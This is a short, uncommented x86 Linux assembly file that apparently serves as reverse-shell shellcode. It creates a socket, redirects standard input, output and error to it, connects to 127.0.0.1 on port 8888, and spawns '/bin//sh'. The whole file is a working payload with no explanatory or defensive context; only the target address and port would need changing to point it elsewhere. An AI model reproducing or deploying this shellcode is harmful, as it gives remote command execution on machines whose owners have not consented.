global _start			

section .text
_start:
	xor ebx,ebx
	mul ebx
	push ebx
	inc ebx
	push ebx
	push byte +0x2
	mov ecx,esp
	mov al,0x66
	int 0x80
	xchg eax,ebx
	pop ecx
	
test:
	mov al,0x3f
	int 0x80
	dec ecx
	jns test
	push dword 0x100007f
	push dword 0xb8220002
	mov ecx,esp
	mov al,0x66
	push eax
	push ecx
	push ebx
	mov bl,0x3
	mov ecx,esp
	int 0x80
	push edx
	push dword 0x68732f6e
	push dword 0x69622f2f
	mov ebx,esp
	push edx
	push ebx
	mov ecx,esp
	mov al,0xb
	int 0x80
